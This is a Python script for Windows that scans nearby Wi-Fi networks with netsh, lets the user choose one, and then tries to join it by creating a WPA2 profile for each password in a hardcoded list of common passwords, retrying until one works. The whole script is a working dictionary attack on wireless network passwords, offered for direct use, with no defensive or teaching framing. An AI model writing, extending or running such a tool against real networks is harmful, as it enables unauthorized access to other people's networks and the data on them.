import subprocess
import time


def list_available_wifi():
    """List available Wi-Fi networks on Windows."""
    try:
        print("Scanning for available Wi-Fi networks...")
        result = subprocess.run(
            ["netsh", "wlan", "show", "network", "mode=bssid"],
            capture_output=True,
            text=True,
            check=True
        )
        networks = []
        for line in result.stdout.splitlines():
            if "SSID" in line and "BSSID" not in line:
                ssid = line.split(":", 1)[1].strip()
                if ssid:
                    networks.append(ssid)
        return networks
    except Exception as e:
        print(f"An error occurred while scanning Wi-Fi networks: {e}")
        return []


def connect_to_wifi(ssid, password):
    """
    Attempt to connect to a Wi-Fi network with the provided password.

    Returns:
        bool: True if connection was successful, False otherwise.
    """
    print(f"Trying to connect to '{ssid}' with password: {password}")

    # Create a temporary Wi-Fi profile
    profile = f"""
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
        <name>{ssid}</name>
        <SSIDConfig>
            <SSID>
                <name>{ssid}</name>
            </SSID>
        </SSIDConfig>
        <connectionType>ESS</connectionType>
        <connectionMode>manual</connectionMode>
        <MSM>
            <security>
                <authEncryption>
                    <authentication>WPA2PSK</authentication>
                    <encryption>AES</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>{password}</keyMaterial>
                </sharedKey>
            </security>
        </MSM>
    </WLANProfile>
    """
    try:
        # Save the profile to a temporary XML file
        profile_path = "wifi_profile.xml"
        with open(profile_path, "w") as f:
            f.write(profile)

        # Add the profile
        subprocess.run(
            ["netsh", "wlan", "add", "profile", f"filename={profile_path}", "user=all"],
            capture_output=True,
            text=True,
            check=True
        )

        # Attempt to connect
        result = subprocess.run(
            ["netsh", "wlan", "connect", f"name={ssid}"],
            capture_output=True,
            text=True,
            timeout=15
        )
        if "Connection request was completed successfully" in result.stdout:
            print(f"Successfully connected to '{ssid}' with password: {password}")
            return True
        else:
            print(f"Failed to connect to '{ssid}' with password: {password}")
            return False
    except subprocess.TimeoutExpired:
        print(f"Connection attempt timed out for '{ssid}'")
        return False
    except subprocess.CalledProcessError as e:
        print(f"Connection attempt failed for '{ssid}': {e.stderr.strip()}")
        return False
    finally:
        # Remove the temporary profile file
        try:
            subprocess.run(
                ["netsh", "wlan", "delete", "profile", f"name={ssid}"],
                capture_output=True,
                text=True
            )
        except Exception as cleanup_error:
            print(f"Failed to clean up profile: {cleanup_error}")


def is_connected(ssid):
    """Check if the system is connected to the given Wi-Fi network."""
    try:
        result = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True,
            text=True
        )
        for line in result.stdout.splitlines():
            if "SSID" in line and ssid in line:
                return True
        return False
    except Exception as e:
        print(f"An error occurred while checking the connection: {e}")
        return False


if __name__ == "__main__":
    # List available Wi-Fi networks
    networks = list_available_wifi()
    if not networks:
        print("No Wi-Fi networks found.")
    else:
        print("\nAvailable Wi-Fi Networks:")
        for idx, ssid in enumerate(networks):
            print(f"{idx + 1}. {ssid}")

        # Prompt user to select a network
        try:
            choice = int(input("\nEnter the number of the Wi-Fi network to connect to: ")) - 1
            if 0 <= choice < len(networks):
                selected_ssid = networks[choice]
                print(f"Selected network: {selected_ssid}")

                # List of passwords to try
                password_list = [
                    "password123",
                    "letmein",
                    "admin123",
                    "qwerty123",
                    "your_custom_password"
                ]

                # Attempt to connect with passwords
                for password in password_list:
                    if connect_to_wifi(selected_ssid, password):
                        if is_connected(selected_ssid):
                            print(f"Successfully connected to '{selected_ssid}'!")
                            break
                    else:
                        print(f"Moving to the next password...")
                        time.sleep(2)  # Small delay between retries
                else:
                    print(f"Failed to connect to '{selected_ssid}' with the provided passwords.")
            else:
                print("Invalid choice. Exiting.")
        except ValueError:
            print("Invalid input. Please enter a number.")
